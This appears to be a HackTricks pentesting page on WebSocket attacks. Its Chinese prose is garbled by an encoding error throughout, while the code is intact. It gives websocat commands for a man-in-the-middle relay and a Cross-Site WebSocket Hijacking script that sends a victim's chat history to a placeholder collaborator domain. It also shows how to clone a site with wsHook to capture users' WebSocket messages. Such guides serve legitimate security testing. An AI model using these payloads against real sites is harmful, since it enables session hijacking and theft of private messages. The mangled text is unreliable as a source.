# WebSocket æ”»å‡»

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS çº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨ HackTricks ä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½ PDF ç‰ˆçš„ HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)** ä¸Šå…³æ³¨æˆ‘ä»¬**ã€‚
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä»€ä¹ˆæ˜¯ WebSockets

WebSocket è¿æ¥æ˜¯é€šè¿‡åˆå§‹çš„ **HTTP** æ¡æ‰‹å»ºç«‹çš„ï¼Œå¹¶ä¸”è¢«è®¾è®¡ä¸º**é•¿æœŸå­˜åœ¨**ï¼Œå…è®¸åœ¨ä»»ä½•æ—¶å€™è¿›è¡ŒåŒå‘æ¶ˆæ¯ä¼ é€’ï¼Œæ— éœ€äº‹åŠ¡ç³»ç»Ÿã€‚è¿™ä½¿å¾— WebSockets ç‰¹åˆ«é€‚ç”¨äºéœ€è¦**ä½å»¶è¿Ÿæˆ–æœåŠ¡å™¨å‘èµ·çš„é€šä¿¡**çš„åº”ç”¨ï¼Œæ¯”å¦‚å®æ—¶é‡‘èæ•°æ®æµã€‚

### å»ºç«‹ WebSocket è¿æ¥

æœ‰å…³å»ºç«‹ WebSocket è¿æ¥çš„è¯¦ç»†è¯´æ˜ï¼Œè¯·è®¿é—®[**æ­¤å¤„**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)ã€‚ç®€è€Œè¨€ä¹‹ï¼ŒWebSocket è¿æ¥é€šå¸¸æ˜¯é€šè¿‡å®¢æˆ·ç«¯ JavaScript å‘èµ·çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss` åè®®è¡¨ç¤ºé€šè¿‡ **TLS** åŠ å¯†çš„ WebSocket è¿æ¥ï¼Œè€Œ `ws` è¡¨ç¤ºä¸€ä¸ª**æœªåŠ å¯†**çš„è¿æ¥ã€‚

åœ¨å»ºç«‹è¿æ¥æ—¶ï¼Œæµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´ä¼šé€šè¿‡ HTTP æ‰§è¡Œæ¡æ‰‹ã€‚æ¡æ‰‹è¿‡ç¨‹æ¶‰åŠæµè§ˆå™¨å‘é€è¯·æ±‚ï¼ŒæœåŠ¡å™¨åšå‡ºå“åº”ï¼Œå¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼š

æµè§ˆå™¨å‘é€æ¡æ‰‹è¯·æ±‚ï¼š
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
æœåŠ¡å™¨çš„æ¡æ‰‹å“åº”ï¼š
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
**WebSocketæ¡æ‰‹çš„å…³é”®ç‚¹ï¼š**

- `Connection`å’Œ`Upgrade`å¤´éƒ¨ä¿¡å·å¯åŠ¨WebSocketæ¡æ‰‹ã€‚
- `Sec-WebSocket-Version`å¤´éƒ¨æŒ‡ç¤ºæ‰€éœ€çš„WebSocketåè®®ç‰ˆæœ¬ï¼Œé€šå¸¸ä¸º`13`ã€‚
- åœ¨`Sec-WebSocket-Key`å¤´éƒ¨ä¸­å‘é€ä¸€ä¸ªBase64ç¼–ç çš„éšæœºå€¼ï¼Œç¡®ä¿æ¯æ¬¡æ¡æ‰‹éƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œæœ‰åŠ©äºé˜²æ­¢ç¼“å­˜ä»£ç†å‡ºç°é—®é¢˜ã€‚è¿™ä¸ªå€¼ä¸æ˜¯ç”¨äºèº«ä»½éªŒè¯ï¼Œè€Œæ˜¯ç”¨äºç¡®è®¤å“åº”ä¸æ˜¯ç”±é…ç½®é”™è¯¯çš„æœåŠ¡å™¨æˆ–ç¼“å­˜ç”Ÿæˆçš„ã€‚
- æœåŠ¡å™¨å“åº”ä¸­çš„`Sec-WebSocket-Accept`å¤´éƒ¨æ˜¯`Sec-WebSocket-Key`çš„å“ˆå¸Œå€¼ï¼ŒéªŒè¯æœåŠ¡å™¨æ‰“ç®—æ‰“å¼€WebSocketè¿æ¥çš„æ„å›¾ã€‚

è¿™äº›ç‰¹æ€§ç¡®ä¿æ¡æ‰‹è¿‡ç¨‹å®‰å…¨å¯é ï¼Œä¸ºé«˜æ•ˆçš„å®æ—¶é€šä¿¡é“ºå¹³é“è·¯ã€‚
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
æˆ–è€…åˆ›å»ºä¸€ä¸ªwebsocatæœåŠ¡å™¨ï¼š
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### ä¸­é—´äººæ”»å‡» websocket è¿æ¥

å¦‚æœå‘ç°å®¢æˆ·ç«¯ä»å½“å‰æœ¬åœ°ç½‘ç»œè¿æ¥åˆ°ä¸€ä¸ª **HTTP websocket**ï¼Œä½ å¯ä»¥å°è¯•è¿›è¡Œ [ARP Spoofing æ”»å‡»](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) æ¥åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´æ‰§è¡Œä¸­é—´äººæ”»å‡»ã€‚\
ä¸€æ—¦å®¢æˆ·ç«¯å°è¯•è¿æ¥åˆ°ä½ ï¼Œä½ å¯ä»¥ä½¿ç”¨ï¼š
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websocketsæšä¸¾

æ‚¨å¯ä»¥ä½¿ç”¨**å·¥å…·**[**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS)**è‡ªåŠ¨å‘ç°ã€æŒ‡çº¹è¯†åˆ«å’Œæœç´¢websocketsä¸­å·²çŸ¥çš„**æ¼æ´ã€‚

### Websocketè°ƒè¯•å·¥å…·

- **Burp Suite**æ”¯æŒMitMæ–¹å¼æ‹¦æˆªwebsocketsé€šä¿¡ï¼Œä¸æ‹¦æˆªå¸¸è§„HTTPé€šä¿¡çš„æ–¹å¼éå¸¸ç›¸ä¼¼ã€‚
- [**socketsleuth**](https://github.com/snyk/socketsleuth)**Burp Suiteæ‰©å±•**å°†å…è®¸æ‚¨é€šè¿‡è·å–**å†å²è®°å½•**ã€è®¾ç½®**æ‹¦æˆªè§„åˆ™**ã€ä½¿ç”¨**åŒ¹é…å’Œæ›¿æ¢**è§„åˆ™ã€ä½¿ç”¨**Intruder**å’Œ**AutoRepeater**æ›´å¥½åœ°ç®¡ç†Burpä¸­çš„Websocketé€šä¿¡ã€‚
- [**WSSiP**](https://github.com/nccgroup/wssip)**ï¼š**ç®€ç§°â€œ**WebSocket/Socket.ioä»£ç†**â€ï¼Œè¿™ä¸ªç”¨Node.jsç¼–å†™çš„å·¥å…·æä¾›äº†ä¸€ä¸ªç”¨æˆ·ç•Œé¢ï¼Œç”¨äº**æ•è·ã€æ‹¦æˆªã€å‘é€è‡ªå®šä¹‰**æ¶ˆæ¯ï¼Œå¹¶æŸ¥çœ‹å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ‰€æœ‰WebSocketå’ŒSocket.IOé€šä¿¡ã€‚
- [**wsrepl**](https://github.com/doyensec/wsrepl)æ˜¯ä¸€ä¸ªä¸“ä¸ºæ¸—é€æµ‹è¯•è®¾è®¡çš„**äº¤äº’å¼websocket REPL**ã€‚å®ƒæä¾›äº†ä¸€ä¸ªç•Œé¢ï¼Œç”¨äºè§‚å¯Ÿ**ä¼ å…¥çš„websocketæ¶ˆæ¯å¹¶å‘é€æ–°æ¶ˆæ¯**ï¼Œå¹¶æä¾›äº†ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„æ¡†æ¶æ¥**è‡ªåŠ¨åŒ–**è¿™ç§é€šä¿¡ã€‚&#x20;
- [**https://websocketking.com/**](https://websocketking.com/)æ˜¯ä¸€ä¸ªç”¨äºä½¿ç”¨**websockets**ä¸å…¶ä»–ç½‘ç«™è¿›è¡Œé€šä¿¡çš„**ç½‘ç«™**ã€‚
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket)é™¤äº†å…¶ä»–ç±»å‹çš„é€šä¿¡/åè®®å¤–ï¼Œå®ƒè¿˜æä¾›äº†ä¸€ä¸ªç”¨äºä½¿ç”¨**websockets**ä¸å…¶ä»–ç½‘ç«™è¿›è¡Œé€šä¿¡çš„**ç½‘ç«™**ã€‚

## Websocketå®éªŒå®¤

åœ¨[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course)ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªä½¿ç”¨websocketså¯åŠ¨webçš„ä»£ç ï¼Œåœ¨[**æ­¤æ–‡ç« **](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/)ä¸­å¯ä»¥æ‰¾åˆ°è§£é‡Šã€‚

## è·¨ç«™ç‚¹WebSocketåŠ«æŒï¼ˆCSWSHï¼‰

**è·¨ç«™ç‚¹WebSocketåŠ«æŒ**ï¼Œä¹Ÿç§°ä¸º**è·¨æºWebSocketåŠ«æŒ**ï¼Œè¢«ç¡®å®šä¸ºå½±å“WebSocketæ¡æ‰‹çš„ç‰¹å®š**[è·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰](csrf-cross-site-request-forgery.md)**çš„ä¸€ç§æƒ…å†µã€‚å½“WebSocketæ¡æ‰‹ä»…é€šè¿‡**HTTP cookie**è¿›è¡Œèº«ä»½éªŒè¯è€Œæ²¡æœ‰**CSRFä»¤ç‰Œ**æˆ–ç±»ä¼¼çš„å®‰å…¨æªæ–½æ—¶ï¼Œå°±ä¼šå‡ºç°æ­¤æ¼æ´ã€‚

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæ‰˜ç®¡ä¸€ä¸ª**æ¶æ„ç½‘é¡µ**ï¼Œè¯¥ç½‘é¡µå‘èµ·ä¸æ˜“å—æ”»å‡»åº”ç”¨ç¨‹åºçš„è·¨ç«™WebSocketè¿æ¥ã€‚å› æ­¤ï¼Œæ­¤è¿æ¥è¢«è§†ä¸ºå—å®³è€…ä¸åº”ç”¨ç¨‹åºä¼šè¯çš„ä¸€éƒ¨åˆ†ï¼Œåˆ©ç”¨ä¼šè¯å¤„ç†æœºåˆ¶ä¸­ç¼ºä¹CSRFä¿æŠ¤ã€‚

### ç®€å•æ”»å‡»

è¯·æ³¨æ„ï¼Œåœ¨**å»ºç«‹****websocket**è¿æ¥æ—¶ï¼Œ**cookie**ä¼š**å‘é€**åˆ°æœåŠ¡å™¨ã€‚**æœåŠ¡å™¨**å¯èƒ½ä¼šä½¿ç”¨å®ƒæ¥**å…³è”**æ¯ä¸ª**ç‰¹å®š**çš„**ç”¨æˆ·**ä¸å…¶åŸºäºå‘é€cookieçš„**websocket**ä¼šè¯ã€‚

ç„¶åï¼Œä¾‹å¦‚ï¼Œå¦‚æœ**websocket** **æœåŠ¡å™¨**åœ¨å‘é€åŒ…å«â€œ**READY**â€æ¶ˆæ¯çš„æƒ…å†µä¸‹è¿”å›ç”¨æˆ·çš„å¯¹è¯**å†å²è®°å½•**ï¼Œé‚£ä¹ˆé€šè¿‡**ç®€å•çš„XSS**å»ºç«‹è¿æ¥ï¼ˆ**cookie**å°†è¢«**è‡ªåŠ¨å‘é€**ä»¥æˆæƒå—å®³è€…ç”¨æˆ·ï¼‰ï¼Œ**å‘é€**â€œ**READY**â€å°†èƒ½å¤Ÿ**æ£€ç´¢**å¯¹è¯çš„**å†å²è®°å½•**ã€‚
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### è·¨åŸŸ + å…·æœ‰ä¸åŒå­åŸŸçš„ Cookie

åœ¨è¿™ç¯‡åšæ–‡[https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/)ä¸­ï¼Œæ”»å‡»è€…æˆåŠŸåœ¨è¿›è¡Œ Websocket é€šä¿¡çš„åŸŸçš„**å­åŸŸ**ä¸­**æ‰§è¡Œä»»æ„ JavaScript**ã€‚ç”±äºå®ƒæ˜¯ä¸€ä¸ª**å­åŸŸ**ï¼Œ**cookie**è¢«**å‘é€**ï¼Œå¹¶ä¸”ç”±äº**Websocket æ²¡æœ‰æ­£ç¡®æ£€æŸ¥æ¥æº**ï¼Œå› æ­¤å¯ä»¥ä¸å…¶é€šä¿¡å¹¶**ä»ä¸­çªƒå–ä»¤ç‰Œ**ã€‚

### ä»ç”¨æˆ·é‚£é‡Œçªƒå–æ•°æ®

å¤åˆ¶æ‚¨æƒ³è¦å†’å……çš„ Web åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚ .html æ–‡ä»¶ï¼‰ï¼Œå¹¶åœ¨è¿›è¡Œ Websocket é€šä¿¡çš„è„šæœ¬ä¸­æ·»åŠ æ­¤ä»£ç ï¼š
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
ç°åœ¨ä»[https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook)ä¸‹è½½`wsHook.js`æ–‡ä»¶ï¼Œå¹¶**å°†å…¶ä¿å­˜åœ¨åŒ…å«ç½‘é¡µæ–‡ä»¶çš„æ–‡ä»¶å¤¹ä¸­**ã€‚\
æš´éœ²ç½‘é¡µåº”ç”¨ç¨‹åºå¹¶è®©ç”¨æˆ·è¿æ¥åˆ°å®ƒï¼Œæ‚¨å°†èƒ½å¤Ÿé€šè¿‡websocketçªƒå–å‘é€å’Œæ¥æ”¶çš„æ¶ˆæ¯ï¼š
```javascript
sudo python3 -m http.server 80
```
## ç«äº‰æ¡ä»¶

WebSocketsä¸­çš„ç«äº‰æ¡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œ[æŸ¥çœ‹æ­¤ä¿¡æ¯ä»¥äº†è§£æ›´å¤š](race-condition.md#rc-in-websockets)ã€‚

## å…¶ä»–æ¼æ´

ç”±äºWebSocketsæ˜¯ä¸€ç§å°†æ•°æ®å‘é€åˆ°æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯çš„æœºåˆ¶ï¼Œå–å†³äºæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å¦‚ä½•å¤„ç†ä¿¡æ¯ï¼ŒWebSocketså¯ä»¥è¢«ç”¨æ¥åˆ©ç”¨å…¶ä»–å‡ ç§æ¼æ´ï¼Œå¦‚XSSã€SQLiæˆ–ä½¿ç”¨æ¥è‡ªWebSocketsçš„ç”¨æˆ·è¾“å…¥çš„ä»»ä½•å…¶ä»–å¸¸è§Webæ¼æ´ã€‚

## **WebSocketåŠ«æŒ**

è¿™ç§æ¼æ´å¯èƒ½å…è®¸æ‚¨é€šè¿‡è®©åå‘ä»£ç†è®¤ä¸ºå·²å»ºç«‹äº†WebSocketé€šä¿¡ï¼ˆå³ä½¿äº‹å®å¹¶éå¦‚æ­¤ï¼‰æ¥**ç»•è¿‡åå‘ä»£ç†çš„é™åˆ¶**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€…**è®¿é—®éšè—çš„ç«¯ç‚¹**ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ä¸Š**å…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
